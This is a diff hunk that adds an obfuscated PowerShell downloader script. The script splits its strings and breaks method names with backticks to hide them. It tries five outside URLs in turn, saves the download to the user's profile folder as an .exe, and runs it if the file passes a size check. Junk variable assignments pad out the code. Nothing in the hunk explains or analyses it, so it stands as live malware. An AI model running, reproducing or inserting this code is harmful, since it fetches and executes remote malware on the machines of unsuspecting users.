@@ -1,0 +1,20 @@
+$Kqldfmbvr='Xidvorbkkcgta';
+$Fymbhyexmh = '593';
+$Nnrgqikkfqy='Bjspcpsecqf';
+$Osxjsuvbbxzc=$env:userprofile+'\'+$Fymbhyexmh+'.exe';
+$Qeewlohvnhzjg='Tqytjxitodxzf';
+$Pvqkrnoao=&('new-ob'+'jec'+'t') nET.WebcLIEnt;
+$Fkmngitga='http://oniongames.jp/contact/iY/*http://pmthome.com/posta/dr3zxa/*http://urgeventa.es/img/k35d9q/*https://solmec.com.ar/sitio/nTXZomKCx/*https://tiagocambara.com/cgi-bin/s96/'."SpL`IT"('*');
+$Xmvtsffjfj='Nbsfvavkmslb';
+foreach($Qtykmgpyyczy in $Fkmngitga){
+    try{
+        $Pvqkrnoao."d`OWnloa`DfIlE"($Qtykmgpyyczy, $Osxjsuvbbxzc);
+        $Lqsnocick='Mwrnhskzeus';
+        If ((&('Ge'+'t'+'-Item') $Osxjsuvbbxzc)."l`eNg`Th" -ge 36952) {
+            [Diagnostics.Process]::"S`TARt"($Osxjsuvbbxzc);
+            $Zjcyebtu='Pqrvhklqerie';
+            break;
+            $Fzbbuntuulpsg='Musmxxqbo'}
+    }catch{}
+}
+$Jbrhtvgftfzs='Bvvggpdikswqr'
